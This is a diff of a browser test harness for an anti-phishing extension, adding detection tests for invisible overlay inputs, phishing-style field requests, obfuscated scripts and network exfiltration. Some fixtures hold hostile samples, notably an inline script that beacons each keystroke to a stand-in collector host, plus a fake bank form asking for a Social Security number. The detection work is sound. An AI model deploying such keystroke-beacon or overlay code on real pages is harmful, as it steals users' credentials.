@@ -3,9 +3,11 @@
 <body>
 <pre id="out">running</pre>
 <script>
-// Test harness: drives content.js inside isolated iframes with a stubbed
-// chrome API, then asserts on the banner the extension actually renders.
-// Sources are injected as base64 by the runner script.
+// Test harness: drives the extension inside isolated iframes with a stubbed
+// chrome API, then asserts on the banner it actually renders. Sources are
+// injected as base64 by the runner script, in manifest load order.
+const PROBE_JS = decodeURIComponent(escape(atob(window.__PROBE_B64)));
+const INSPECTION_JS = decodeURIComponent(escape(atob(window.__INSPECTION_B64)));
 const CONTENT_JS = decodeURIComponent(escape(atob(window.__CONTENT_B64)));
 const BACKGROUND_JS = decodeURIComponent(escape(atob(window.__BACKGROUND_B64)));
 
@@ -26,7 +28,7 @@ function makeFrame(bodyHtml, headHtml) {
   return f;
 }
 
-// Runs content.js inside a frame with chrome.runtime.sendMessage answering
+// Runs the extension inside a frame with chrome.runtime.sendMessage answering
 // from `replies`. Set replies[type] = null to simulate a failed lookup.
 function runExtension(frame, replies, delayMs) {
   const w = frame.contentWindow;
@@ -39,9 +41,21 @@ function runExtension(frame, replies, delayMs) {
       },
     },
   };
+  for (const src of [PROBE_JS, INSPECTION_JS, CONTENT_JS]) {
+    const s = w.document.createElement('script');
+    s.textContent = src;
+    w.document.body.appendChild(s);
+  }
+}
+
+// Loads only the Tier 2 module, for asserting individual criteria against a
+// DOM without going through message selection.
+function inspectorIn(frame) {
+  const w = frame.contentWindow;
   const s = w.document.createElement('script');
-  s.textContent = CONTENT_JS;
+  s.textContent = INSPECTION_JS;
   w.document.body.appendChild(s);
+  return w.PLSR_PAGE_INSPECTION;
 }
 
 function bannerText(frame) {
@@ -54,7 +68,7 @@ function bannerLevel(frame) {
   return el.className.includes('plsr-danger') ? 'danger' : 'warning';
 }
 function toastText(frame) {
-  const el = frame.contentDocument.querySelector('.plsr-toast');
+  const el = frame.contentDocument.querySelector('.plsr-toast-message');
   return el ? el.textContent : null;
 }
 function whyList(frame) {
@@ -63,6 +77,15 @@ function whyList(frame) {
 function focusPassword(frame) {
   const input = frame.contentDocument.querySelector('input[type=password]');
   input.dispatchEvent(new frame.contentWindow.FocusEvent('focusin', { bubbles: true }));
+  return input;
+}
+// A keystroke, then whatever the page does in response. The probe stamps the
+// keystroke from a capture-phase listener on the document, so it always sees
+// it before the page's own handler runs.
+function typePassword(frame) {
+  const input = frame.contentDocument.querySelector('input[type=password]');
+  input.dispatchEvent(new frame.contentWindow.KeyboardEvent('keydown', { bubbles: true, key: 'a' }));
+  input.dispatchEvent(new frame.contentWindow.Event('input', { bubbles: true }));
   return input;
 }
 
@@ -130,7 +153,7 @@ async function main() {
     focusPassword(f);
     await wait(20);
     check('4a clean: no banner', bannerText(f), null);
-    check('4b clean: shows toast', toastText(f), 'Checked this site — looks fine.');
+    check('4b clean: shows toast', toastText(f), 'Checked this site, looks fine.');
   }
 
   // --- 5. Plain HTTP -> warning ------------------------------------------
@@ -236,25 +259,274 @@ async function main() {
     check('11 same-origin form: no false positive', bannerText(f), null);
   }
 
-  // --- 12. background.js pure helpers ------------------------------------
+  // --- 12. Tier 2: an invisible input layered over the password field -----
+  {
+    const f = makeFrame(
+      '<form action="/login"><div style="position:relative;width:200px">' +
+      '<input type="password" id="p" style="width:200px;height:26px;box-sizing:border-box">' +
+      '<input type="password" id="grab" style="position:absolute;left:0;top:0;width:200px;height:26px;' +
+      'box-sizing:border-box;opacity:0.01;border:none">' +
+      '</div></form>',
+      meta('demo-hostname', 'clean-looking-portal.com') + meta('demo-https', 'true') +
+      meta('demo-domain-age-days', '4000') + meta('demo-blocklist-hit', 'false') +
+      meta('demo-first-visit', 'false') + meta('demo-arrived-via-link', 'false'));
+    runExtension(f, {});
+    await wait(20);
+    focusPassword(f);
+    await wait(20);
+    check('12a overlay: message', bannerText(f),
+      "The box you're typing into isn't part of this page — something is layered over it.");
+    check('12b overlay: level', bannerLevel(f), 'danger');
+    check('12c overlay: why reports how many points were covered', whyList(f).join('|'),
+      (v) => /covers \d+ of \d+ points/.test(v));
+  }
+
+  // --- 13. Overlay negative: a non-hit-testable layer is not a capture ----
+  // pointer-events:none cannot receive input, so it is not an attack, and
+  // elementsFromPoint correctly declines to report it.
+  {
+    const f = makeFrame(
+      '<form action="/login"><div style="position:relative;width:200px">' +
+      '<input type="password" id="p" style="width:200px;height:26px;box-sizing:border-box">' +
+      '<div style="position:absolute;inset:0;pointer-events:none;background:transparent"></div>' +
+      '</div></form>',
+      meta('demo-hostname', 'decorative-overlay.com') + meta('demo-https', 'true') +
+      meta('demo-domain-age-days', '4000') + meta('demo-blocklist-hit', 'false') +
+      meta('demo-first-visit', 'false') + meta('demo-arrived-via-link', 'false'));
+    runExtension(f, {});
+    await wait(20);
+    focusPassword(f);
+    await wait(20);
+    check('13 overlay negative: pointer-events:none does not fire', bannerText(f), null);
+  }
+
+  // --- 14. Tier 2: implausible field inventory ---------------------------
+  {
+    const f = makeFrame(
+      '<h1>Chase</h1><form action="/login">' +
+      '<input type="password" id="p">' +
+      '<input name="ssn" placeholder="Social Security Number">' +
+      '<input name="dob" placeholder="Date of Birth">' +
+      '</form>',
+      meta('demo-hostname', 'account-verification-center.com') + meta('demo-https', 'true') +
+      meta('demo-domain-age-days', '4000') + meta('demo-blocklist-hit', 'false') +
+      meta('demo-first-visit', 'false') + meta('demo-arrived-via-link', 'false'));
+    runExtension(f, {});
+    await wait(20);
+    focusPassword(f);
+    await wait(20);
+    check('14a inventory: level', bannerLevel(f), 'danger');
+    check('14b inventory: names the brand and the extra categories', bannerText(f),
+      (v) => v && v.startsWith('Chase does not ask for') &&
+             v.includes('Social Security') && v.includes('date of birth'));
+  }
+
+  // --- 15. Inventory negative: a real "sign up and pay" form -------------
+  // Password + card is one extra category, under the threshold of two, on
+  // purpose: combined signup/checkout flows are legitimate and common.
+  {
+    const f = makeFrame(
+      '<h1>Streaming Co</h1><form action="/signup">' +
+      '<input type="password" id="p">' +
+      '<input name="cardnumber" autocomplete="cc-number" placeholder="Card number">' +
+      '<input name="cvc" autocomplete="cc-csc" placeholder="CVC">' +
+      '</form>',
+      meta('demo-hostname', 'streaming-co.com') + meta('demo-https', 'true') +
+      meta('demo-domain-age-days', '4000') + meta('demo-blocklist-hit', 'false') +
+      meta('demo-first-visit', 'false') + meta('demo-arrived-via-link', 'false'));
+    runExtension(f, {});
+    await wait(20);
+    focusPassword(f);
+    await wait(20);
+    check('15 inventory negative: password + card is not flagged', bannerText(f), null);
+  }
+
+  // --- 16. Tier 2: obfuscated inline script ------------------------------
+  {
+    // A real, executing packer preamble (it evaluates the empty string), so
+    // the check is matching genuine page content rather than inert markup.
+    const packed = '<script>eval(function(p,a,c,k,e,d){return p}("",0,0,"".split("|"),0,{}));/*' +
+      'A'.repeat(900) + '*/<\/script>';
+    const f = makeFrame('<h1>Login</h1><form action="/login"><input type="password" id="p"></form>' + packed,
+      meta('demo-hostname', 'ordinary-domain.com') + meta('demo-https', 'true') +
+      meta('demo-domain-age-days', '4000') + meta('demo-blocklist-hit', 'false') +
+      meta('demo-first-visit', 'false') + meta('demo-arrived-via-link', 'false'));
+    runExtension(f, {});
+    await wait(20);
+    focusPassword(f);
+    await wait(20);
+    check('16a obfuscation: level', bannerLevel(f), 'warning');
+    check('16b obfuscation: message', bannerText(f),
+      'The code running on this page is deliberately scrambled, which a real sign-in page has no reason to do.');
+  }
+
+  // --- 17. Obfuscation negative: this suite's own injected sources --------
+  // Every frame above has three large inline extension scripts in it. Normal,
+  // commented JavaScript measures ~4.9-5.2 bits/char, which is why entropy is
+  // only counted alongside line density and never on its own. If that pairing
+  // regresses, every other test in this file starts reporting "scrambled".
+  {
+    const f = makeFrame('<form action="/login"><input type="password" id="p"></form>', '');
+    const I = inspectorIn(f);
+    check('17a obfuscation negative: readable source is not flagged',
+      I.checks.checkObfuscatedScript(), null);
+    check('17b entropy of readable source is above the old 4.6 threshold',
+      I.checks.shannonEntropy(INSPECTION_JS) > 4.6, true);
+  }
+
+  // --- 18. Tier 2: third-party credential frame ---------------------------
+  {
+    const f = makeFrame(
+      '<div style="position:relative;width:300px;height:120px">' +
+      '<form action="/login" style="width:300px;height:120px"><input type="password" id="p"></form>' +
+      '<iframe src="https://widget.unknown-vendor.invalid/pay" ' +
+      'style="position:absolute;left:0;top:0;width:300px;height:120px;border:0"></iframe>' +
+      '</div>', '');
+    const I = inspectorIn(f);
+    const field = f.contentDocument.querySelector('input[type=password]');
+    const found = I.checks.checkThirdPartyCredentialFrame(field);
+    check('18a third-party frame: fires for an unknown vendor',
+      found && found.host, 'widget.unknown-vendor.invalid');
+    check('18b third-party frame: hosted payment providers are allowlisted',
+      I.CRITERIA.thirdPartyCredentialFrame.knownProviders.some((p) => I.sameSite('js.stripe.com', p)), true);
+    check('18c third-party frame: SSO providers are allowlisted',
+      I.CRITERIA.thirdPartyCredentialFrame.knownProviders.some((p) => I.sameSite('login.microsoftonline.com', p)), true);
+  }
+
+  // --- 19. Tier 2: insecure form action, tested directly ------------------
+  // This one cannot be driven through a frame: the harness runs on file://,
+  // and the check deliberately only fires on an https page.
+  {
+    const f = makeFrame('<form action="http://collector.example.net/post"><input type="password" id="p"></form>', '');
+    const I = inspectorIn(f);
+    const field = f.contentDocument.querySelector('input[type=password]');
+    check('19a insecure action: does not fire on a non-https page',
+      I.checks.checkInsecureFormAction(field), null);
+    check('19b insecure action: criteria are reachable and documented',
+      typeof I.CRITERIA.overlay.minCoveredPoints, 'number');
+  }
+
+  // --- 20. Tier 3 (in-page): traffic fired on a keystroke -----------------
+  {
+    const f = makeFrame(
+      '<h1>Login</h1><form action="/login"><input type="password" id="p"></form>' +
+      '<script>document.getElementById("p").addEventListener("input",function(){' +
+      'try{navigator.sendBeacon("https://relay.credential-collector.invalid/k","x")}catch(e){}' +
+      '});<\/script>',
+      meta('demo-hostname', 'looks-completely-fine.com') + meta('demo-https', 'true') +
+      meta('demo-domain-age-days', '4000') + meta('demo-blocklist-hit', 'false') +
+      meta('demo-first-visit', 'false') + meta('demo-arrived-via-link', 'false'));
+    runExtension(f, {});
+    await wait(20);
+    focusPassword(f);
+    await wait(20);
+    check('20a exfil: clean until the page actually does something', bannerText(f), null);
+    typePassword(f);
+    await wait(40);
+    check('20b exfil: message', bannerText(f),
+      'This page is sending what you type as you type it, before you ever hit submit.');
+    check('20c exfil: level', bannerLevel(f), 'danger');
+    check('20d exfil: why names the host and the timing', whyList(f).join('|'),
+      (v) => v.includes('relay.credential-collector.invalid') && /\d+ms after you typed/.test(v));
+  }
+
+  // --- 21. Tier 3 negative: a page talking to itself ----------------------
+  {
+    const f = makeFrame(
+      '<h1>Login</h1><form action="/login"><input type="password" id="p"></form>' +
+      '<script>document.getElementById("p").addEventListener("input",function(){' +
+      'try{navigator.sendBeacon(location.href,"x")}catch(e){}' +
+      '});<\/script>',
+      meta('demo-hostname', 'looks-completely-fine.com') + meta('demo-https', 'true') +
+      meta('demo-domain-age-days', '4000') + meta('demo-blocklist-hit', 'false') +
+      meta('demo-first-visit', 'false') + meta('demo-arrived-via-link', 'false'));
+    runExtension(f, {});
+    await wait(20);
+    focusPassword(f);
+    await wait(20);
+    typePassword(f);
+    await wait(40);
+    check('21 exfil negative: same-origin traffic while typing is not exfil', bannerText(f), null);
+  }
+
+  // --- 22. background.js pure helpers ------------------------------------
   {
     const stubChrome = {
       runtime: { onMessage: { addListener() {} }, onInstalled: { addListener() {} }, getURL: (p) => p },
       alarms: { create() {}, onAlarm: { addListener() {} } },
       storage: { local: { get: async () => ({}), set: async () => {} } },
     };
-    const factory = new Function('chrome', BACKGROUND_JS + '\n;return { registrableDomain, parseFeed };');
+    const factory = new Function('chrome', BACKGROUND_JS +
+      '\n;return { registrableDomain, parseFeed, recordRequest, recordRedirect, summarizeNetworkEvidence, resetTab, NETWORK_CRITERIA };');
     const bg = factory(stubChrome);
 
-    check('12a registrable: simple', bg.registrableDomain('www.github.com'), 'github.com');
-    check('12b registrable: deep subdomain', bg.registrableDomain('a.b.c.example.com'), 'example.com');
-    check('12c registrable: multi-part suffix', bg.registrableDomain('www.bbc.co.uk'), 'bbc.co.uk');
-    check('12d registrable: already bare', bg.registrableDomain('example.com'), 'example.com');
-    check('12e registrable: trailing dot', bg.registrableDomain('github.com.'), 'github.com');
-    check('12f parseFeed: strips scheme and path',
+    check('22a registrable: simple', bg.registrableDomain('www.github.com'), 'github.com');
+    check('22b registrable: deep subdomain', bg.registrableDomain('a.b.c.example.com'), 'example.com');
+    check('22c registrable: multi-part suffix', bg.registrableDomain('www.bbc.co.uk'), 'bbc.co.uk');
+    check('22d registrable: already bare', bg.registrableDomain('example.com'), 'example.com');
+    check('22e registrable: trailing dot', bg.registrableDomain('github.com.'), 'github.com');
+    check('22f parseFeed: strips scheme and path',
       bg.parseFeed('https://evil.com/a/b\nhttp://bad.net\n\nnot a domain\n').join(','), 'evil.com,bad.net');
-    check('12g parseFeed: dedupes',
+    check('22g parseFeed: dedupes',
       bg.parseFeed('https://x.com\nhttps://x.com/other').join(','), 'x.com');
+
+    // --- Tier 3 (webRequest half) ---------------------------------------
+    // Driven through the real entry points: a main_frame request is what
+    // resets a tab's buffer, exactly as the listener would see it.
+    const navigate = (url) => bg.recordRequest({ tabId: 1, type: 'main_frame', url });
+    const req = (o) => bg.recordRequest({ tabId: 1, type: 'xmlhttprequest', method: 'POST', ...o });
+    const summ = (tabId) => bg.summarizeNetworkEvidence(tabId === undefined ? 1 : tabId).networkEvidence;
+
+    navigate('https://shop.example.com/checkout');
+    req({ url: 'https://api.telegram.org/bot123:ABC/sendMessage' });
+    check('22h exfil service: matched on the full URL, host-only retained',
+      summ().exfilServices.map((s) => s.label + '@' + s.host).join(','), 'Telegram@api.telegram.org');
+
+    navigate('https://shop.example.com/checkout');
+    req({ url: 'https://discord.com/api/v10/users/@me' });
+    check('22i exfil service negative: ordinary API paths are not webhooks',
+      summ().exfilServices.length, 0);
+    req({ url: 'https://discord.com/api/webhooks/123/abc' });
+    check('22j exfil service: the webhook path does match', summ().exfilServices.length, 1);
+
+    navigate('https://shop.example.com/checkout');
+    req({ url: 'http://185.220.101.7/collect', type: 'script' });
+    check('22k raw IP: recorded for code and data requests',
+      summ().rawIpHosts.join(','), '185.220.101.7');
+
+    navigate('https://shop.example.com/checkout');
+    req({ url: 'http://185.220.101.7/pixel.gif', type: 'image' });
+    check('22l raw IP negative: an image off an IP is a misconfiguration',
+      summ().rawIpHosts.length, 0);
+
+    navigate('https://shop.example.com/checkout');
+    req({ url: 'https://cdn.jsdelivr.net/npm/thing.js', type: 'script' });
+    req({ url: 'https://shop.example.com/app.js', type: 'script' });
+    check('22m script origins: CDNs and same-site are not "unrelated"',
+      summ().unrelatedScriptHosts.length, 0);
+    req({ url: 'https://unrelated-host.ru/loader.js', type: 'script' });
+    check('22n script origins: an unrelated host is reported',
+      summ().unrelatedScriptHosts.join(','), 'unrelated-host.ru');
+
+    navigate('https://hop-one.com/a');
+    bg.recordRedirect({ tabId: 1, type: 'main_frame', url: 'https://hop-one.com/a', redirectUrl: 'https://hop-two.com/b' });
+    check('22o redirect chain: one hop is under the threshold', summ().redirectChain, null);
+    bg.recordRedirect({ tabId: 1, type: 'main_frame', url: 'https://hop-two.com/b', redirectUrl: 'https://final-destination.com/login' });
+    const chain = summ().redirectChain;
+    check('22p redirect chain: two hops across two sites is reported', chain && chain.hops, 2);
+
+    navigate('https://bit.ly/xyz');
+    bg.recordRedirect({ tabId: 1, type: 'main_frame', url: 'https://bit.ly/xyz', redirectUrl: 'https://final-destination.com/login' });
+    check('22q redirect chain: a shortener counts on its own',
+      Boolean(summ().redirectChain), true);
+
+    // A redirect rewrites the page's origin, so same-site comparisons after
+    // one have to be made against where the user actually landed.
+    req({ url: 'https://final-destination.com/app.js', type: 'script' });
+    check('22r redirect: later same-site scripts are judged against the landing host',
+      summ().unrelatedScriptHosts.length, 0);
+
+    check('22s no buffer for an unknown tab is null, not a clean verdict', summ(99), null);
   }
 
   const failed = results.filter((r) => r.startsWith('FAIL')).length;
